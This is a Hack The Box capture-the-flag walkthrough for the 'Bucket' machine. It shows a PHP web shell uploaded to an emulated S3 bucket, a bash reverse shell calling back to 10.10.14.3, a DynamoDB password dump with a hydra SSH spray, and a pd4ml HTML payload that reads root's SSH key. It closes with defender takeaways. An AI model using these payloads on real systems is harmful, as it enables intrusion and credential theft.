# Bucket — HTB (AWS S3 & DynamoDB)

**Bucket** is a Linux box built around a locally-emulated AWS stack (LocalStack). A misconfigured S3 bucket that backs the website lets you upload a PHP web shell for RCE; a DynamoDB table leaks SSH passwords; and the root step abuses a `root`-owned internal app that renders attacker-controlled HTML to PDF with **pd4ml**, which happily reads local files.

> **Platform:** Hack The Box · **Category:** Web Exploitation · **OS:** Linux · **Focus:** AWS S3 / DynamoDB (LocalStack), PHP RCE, pd4ml local file read

Flags are redacted — this is about the chain.

## Recon

```bash
sudo nmap -sC -sV -Pn 10.10.10.212 -oN nmap.txt
# 22/tcp  OpenSSH 8.2p1
# 80/tcp  Apache 2.4.41 -> redirects to http://bucket.htb/
```

Add `bucket.htb` to `/etc/hosts`. The landing page references an image hosted at `http://s3.bucket.htb/adserver/images/bug.jpg` — a second vhost, and an S3-style URL.

![The bucket.htb landing page](writeups/images/bucket-site.jpg)

`wfuzz` over the `Host:` header confirms the `s3` vhost, and browsing `s3.bucket.htb` returns a JSON status page — this is **LocalStack**, an AWS emulator:

![s3.bucket.htb — LocalStack status JSON](writeups/images/bucket-s3.jpg)

## Foothold — S3 misconfiguration → PHP web shell

The S3 service accepts **any** credentials (anonymous access behind a credential check that isn't enforced). Configure bogus keys and list the bucket:

```bash
aws configure            # key: hackthebox / secret: hackthebox / region: bucket
aws s3 --endpoint-url http://s3.bucket.htb ls
# 2025-09-08 09:41:02 adserver
aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver
#   PRE images/
#   index.html
```

The website's document root **is** this bucket, so anything I upload is served from `bucket.htb`. It serves `.txt`, `.php`, … so I upload a web shell:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > cmd.php
aws s3 --endpoint-url http://s3.bucket.htb cp cmd.php s3://adserver/cmd.php
curl "http://bucket.htb/cmd.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> A cron-like job wipes the bucket every minute, so re-upload the shell if it vanishes.

Upgrade to an interactive reverse shell:

```bash
curl http://bucket.htb/cmd.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'"
# www-data@bucket:/var/www/html$
python3 -c 'import pty;pty.spawn("bash")'
```

## www-data → roy — DynamoDB password reuse

`/home/roy/project/db.php` points at a **DynamoDB** instance on `localhost:4566`. From my own host (reaching Dynamo through the `s3.bucket.htb` proxy) I scan the `users` table:

```bash
aws --endpoint-url http://s3.bucket.htb dynamodb list-tables        # -> "users"
aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users \
  | jq -r '.Items[].password.S'
# Management@#1@#
# Welcome123!
# n2vM-<_K_Q:.Aa2
```

There's one interactive user, `roy`. Spray the three passwords against SSH:

![Hydra finds roy's SSH password](writeups/images/bucket-hydra.jpg)

```bash
hydra -l roy -P passwords ssh://10.10.10.212
# [22][ssh] login: roy  password: n2vM-<_K_Q:.Aa2
ssh roy@10.10.10.212     # user flag (redacted)
```

## roy → root — pd4ml local file read

`netstat` shows an extra service on `127.0.0.1:8000`. The Apache config is the key:

```apache
<VirtualHost 127.0.0.1:8000>
    <IfModule mpm_itk_module>
        AssignUserId root root
    </IfModule>
    DocumentRoot /var/www/bucket-app
</VirtualHost>
```

**`AssignUserId root root`** — the internal app on `:8000` runs as **root**. Its `index.php`, on `POST action=get_alerts`, pulls rows from a DynamoDB `alerts` table whose `title` is `Ransomware`, writes each row's `data` field to `files/<rand>.html`, and converts it to PDF with pd4ml:

```php
file_put_contents('files/'.$name, $item["data"]);
passthru("java ... -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
```

So I fully control the HTML that a **root** process renders — and pd4ml will resolve local `file://` references inside that HTML. I create the `alerts` table, then insert a row whose `data` is HTML that embeds a file only root can read:

```bash
aws --endpoint-url http://s3.bucket.htb dynamodb create-table --table-name alerts \
  --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
  --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
  --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5

aws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts \
  --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><body><pd4ml:attachment src=\"files/id_rsa\" description=\"id_rsa\"/><iframe src=\"file:///root/.ssh/id_rsa\" width=100% height=1000></iframe></body></html>"}}'
```

Trigger the conversion (tunnel `:8000` over SSH, since it's localhost-only) and fetch the PDF:

```bash
ssh -L 8000:localhost:8000 roy@10.10.10.212
curl http://127.0.0.1:8000/index.php --data 'action=get_alerts'
# bucket-app/files/result.pdf now contains the embedded file
```

The rendered PDF contains root's SSH private key (or, just as easily, `file:///root/root.txt`). Use the recovered key to log in as **root**:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@10.10.10.212
# root flag (redacted)
```

## Takeaways (defender view)

- **"It needs credentials" isn't access control.** The S3 endpoint accepted any keys — enforce real authn/authz on object storage, and never let an untrusted bucket back a document root that executes code.
- **Don't run web apps as root.** `AssignUserId root root` turned a benign PDF feature into a root file-read. Run per-vhost apps as least-privileged service users.
- **HTML/PDF renderers read local files.** pd4ml (like wkhtmltopdf, LibreOffice, many others) will follow `file://` references — treat any HTML-to-PDF conversion of user input as an SSRF/LFI sink and sandbox it.
- **Don't reuse passwords across a database and SSH.** The DynamoDB dump was game over for `roy` only because the same secret unlocked the shell.
